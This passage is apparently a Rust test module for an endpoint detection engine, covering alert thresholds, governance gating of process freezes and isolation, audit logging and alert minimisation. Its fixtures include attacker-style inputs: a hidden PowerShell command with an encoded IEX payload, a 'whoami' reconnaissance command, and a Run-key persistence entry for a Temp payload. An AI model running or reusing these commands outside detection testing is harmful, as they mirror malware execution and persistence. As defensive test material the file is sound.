        // A DNS match on its own is LR ~4.3 against a threshold of 1/21, so the
        // theorem says abstain even though the rule fired.
        let mut e = engine();
        let event = TelemetryEvent::new(
            EventId::new(2),
            HostId::new("host-a").unwrap(),
            chrono::Utc::now(),
            EventSource::WindowsEtw,
            model::ProviderId::new("Microsoft-Windows-DNS-Client"),
            3006,
            42,
            42,
            4,
            EventKind::DnsQuery(model::DnsQueryPayload {
                pid: ProcessId::new(42),
                query_name: "cdn.telemetry.xyz".into(),
                query_type: "A".into(),
                answers: Vec::new(),
                response_code: None,
                queried_at: chrono::Utc::now(),
            }),
            Payload::new(Value::Null).unwrap(),
        );

        assert!(e.ingest(&event).is_none(), "weak evidence must not alert");
        assert_eq!(e.metrics().abstained, 1);
        assert_eq!(e.metrics().alerts, 0);
        assert_eq!(
            e.metrics().findings,
            1,
            "the rule still fired and is counted"
        );
    }

    #[test]
    fn isolated_isolation_is_gated_by_policy() {
        // The default policy caps auto-approval at Medium and isolates are
        // severity 5, so even overwhelming evidence cannot auto-isolate.
        let mut e = engine();
        let event = start(
            100,
            4,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            Some("powershell -EncodedCommand SQBFAFgA -WindowStyle Hidden"),
        );
        // Enough evidence to reach the isolate band: repeat the encoded-shell
        // pattern across several process starts from the same evidence key.
        for _ in 0..6 {
            let _ = e.ingest(&event);
        }

        let denied = e.audit().entries().iter().any(|entry| {
            entry.verdict == Verdict::Denied || entry.verdict == Verdict::RequiresApproval
        });
        assert!(
            denied,
            "high-severity actions must not slip through unattended"
        );
        assert!(e.metrics().withheld_by_policy + e.metrics().alerts >= 1);
    }

    #[test]
    fn every_governed_decision_is_audited() {
        let mut e = engine();
        let _ = e.ingest(&start(
            100,
            4,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            Some("powershell -enc AAAA -w hidden"),
        ));
        assert!(
            !e.audit().is_empty(),
            "an action must never be taken silently"
        );
        assert!(
            !e.audit().is_empty(),
            "an action must never be taken silently"
        );
        assert_eq!(
            e.audit().len() as u64,
            e.metrics().alerts + e.metrics().withheld_by_policy
        );
    }

    #[test]
    fn state_and_trace_are_projected_for_every_event() {
        let mut e = engine();
        e.ingest(&start(100, 4, "C:\\a.exe", None));
        e.ingest(&start(101, 100, "C:\\b.exe", None));

        assert_eq!(e.state().len(), 2, "both processes projected into A1");
        assert_eq!(e.trace().len(), 2, "both events appended to A2");

        // The parent/child edge was taught to the structural profile. Both
        // starts carried a parent, so both drew an edge: the second process's
        // parent is already known, while the first process's is not.
        let observation = e.observation(0.0, 1000.0);
        assert_eq!(observation.known_edges, 2);
        assert_eq!(observation.distinct_images, 2);
    }

    #[test]
    fn alert_bodies_are_minimised_before_leaving_the_host() {
        // A registry set under a Run key carries a full path in its detail.
        let mut e = engine();
        let event = TelemetryEvent::new(
            EventId::new(3),
            HostId::new("host-a").unwrap(),
            chrono::Utc::now(),
            EventSource::WindowsEtw,
            model::ProviderId::new("Microsoft-Windows-Kernel-Registry"),
            5,
            7,
            7,
            4,
            EventKind::RegistrySet(RegistrySet {
                pid: ProcessId::new(7),
                key_path: "C:\\Users\\a.smith\\AppData\\Local\\Temp\\payload.exe".into(),
                value_name: Some("Updater".into()),
                value_data: None,
                set_at: chrono::Utc::now(),
            }),
            Payload::new(Value::Null).unwrap(),
        );
        let _ = e.ingest(&event);

        // Directly check the minimiser: the filename must not survive it.
        let minimised = minimise("C:\\Users\\a.smith\\payload.exe written");
        assert!(!minimised.contains("a.smith"), "{minimised}");
        assert!(minimised.contains(".exe"), "{minimised}");
    }

    #[test]
    fn the_threshold_is_derived_from_the_cost_ratio() {
        let mut cfg = Config::new(HostId::new("h").unwrap());
        cfg.costs = Costs::new(1.0, 20.0);
        assert!((cfg.costs.threshold() - 1.0 / 21.0).abs() < 1e-12);

        // Raising the cost of a miss must lower the bar, i.e. alert more.
        cfg.costs = Costs::new(1.0, 100.0);
        assert!(cfg.costs.threshold() < 1.0 / 21.0);
    }

    /// An engine tuned so one strong finding lands in the freeze band.
    ///
    /// Only the response tests need this. Where the posterior lands decides
    /// which rung of the ladder is chosen, and freeze is a narrow band squeezed
    /// between the compensating control below it and isolation above.
    fn engine_at(autonomy: AutonomyLevel) -> Engine {
        let mut cfg = Config::new(HostId::new("host-a").unwrap());
        cfg.prior = 0.5;
        cfg.autonomy = autonomy;
        Engine::new(cfg)
    }

    /// The same engine with a policy that trusts a disruptive action at any
    /// severity.
    ///
    /// The autonomy level says *who* may act; the policy says *what* they may
    /// act on. A freeze is High, so the default `max_auto` of Medium withholds
    /// it even at `Auto` — a test of the cleared path has to say so on purpose.
    fn engine_trusting(autonomy: AutonomyLevel) -> Engine {
        let mut cfg = Config::new(HostId::new("host-a").unwrap());
        cfg.prior = 0.5;
        cfg.autonomy = autonomy;
        cfg.policy = GovernancePolicy {
            max_auto: GovSeverity::Critical,
            require_reversible: true,
        };
        Engine::new(cfg)
    }

    #[test]
    fn only_a_freeze_becomes_something_the_machine_can_feel() {
        // The mapping is a gate in its own right: a kind with no concrete
        // response must produce no proposal, so nothing downstream can invent
        // one. `Isolate` is the one that matters — the alert names it, and
        // pretending to have isolated a host would be a lie in the audit trail.
        let e = engine();
        let event = start(7, 4, "cmd.exe", None);
        for kind in [
            ActionKind::Observe,
            ActionKind::Enrich,
            ActionKind::Alert,
            ActionKind::CompensatingControl,
            ActionKind::Isolate,
            ActionKind::Rollback,
        ] {
            assert!(
                e.planned_response(kind, &event).is_none(),
                "{kind:?} must not map to a host action"
            );
        }
        assert_eq!(
            e.planned_response(ActionKind::Freeze, &event),
            Some(Response::Suspend { pid: 7 }),
            "a freeze is aimed at the process that fired"
        );
    }

    #[test]
    fn a_freeze_is_proposed_and_only_cleared_to_run_when_governance_allows() {
        // The same event three times, differing only in who is allowed to act on
        // it. Every case proposes; only the last may touch the machine.
        let template = "powershell -EncodedCommand SQBFAFgA -WindowStyle Hidden";
        let event = start(100, 4, "powershell.exe", Some(template));

        let mut approving = engine_at(AutonomyLevel::Approve);
        approving.ingest(&event);
        let proposed = approving.take_responses();
        assert_eq!(proposed.len(), 1, "a freeze should have been planned");
        assert!(
            !proposed[0].automatic,
            "Approve means propose, never act: an operator wants to see it"
        );
        assert!(
            proposed[0].response.is_reversible(),
            "suspend can be undone"
        );
        assert_eq!(proposed[0].response.pid(), 100);

        // Auto is permission for whoever acts, not a licence to freeze anything.
        // A freeze is High and the default policy caps unattended action at
        // Medium, so the default deployment still proposes and waits.
        let mut gated = engine_at(AutonomyLevel::Auto);
        gated.ingest(&event);
        let proposed = gated.take_responses();
        assert_eq!(proposed.len(), 1);
        assert!(
            !proposed[0].automatic,
            "the default policy caps unattended action at Medium; a freeze is High"
        );

        // Widen the policy to name the severity it trusts and it clears.
        let mut automatic = engine_trusting(AutonomyLevel::Auto);
        automatic.ingest(&event);
        let proposed = automatic.take_responses();
        assert_eq!(proposed.len(), 1);
        assert!(proposed[0].automatic, "Auto plus a policy that allows it");

        // Draining drains rather than reads, so a second pass over the same
        // events cannot act twice.
        assert!(automatic.take_responses().is_empty());
    }

    #[test]
    fn an_alert_only_response_plans_nothing() {
        // A single weak-ish finding lands on `raise alert`, which changes nothing
        // on the machine and so has nothing to carry out.
        let mut e = engine();
        let alerted = e
            .ingest(&start(
                7,
                4,
                "C:\\Windows\\System32\\cmd.exe",
                Some("cmd /c whoami"),
            ))
            .is_some();
        assert!(!alerted, "nothing here warrants even an alert");
        assert!(e.take_responses().is_empty());
    }

    #[test]
    fn a_proposal_points_at_the_alert_it_belongs_to() {
        // The outcome has to be tieable back to a row, or the console can never
        // say what was done about what.
        let mut e = engine_at(AutonomyLevel::Auto);
        let alert = e
            .ingest(&start(
                100,
                4,
                "powershell.exe",
                Some("powershell -EncodedCommand SQBFAFgA -WindowStyle Hidden"),
            ))
            .expect("alerts");
        let proposed = e.take_responses();
        assert_eq!(proposed[0].alert_id, alert.id);
    }
}
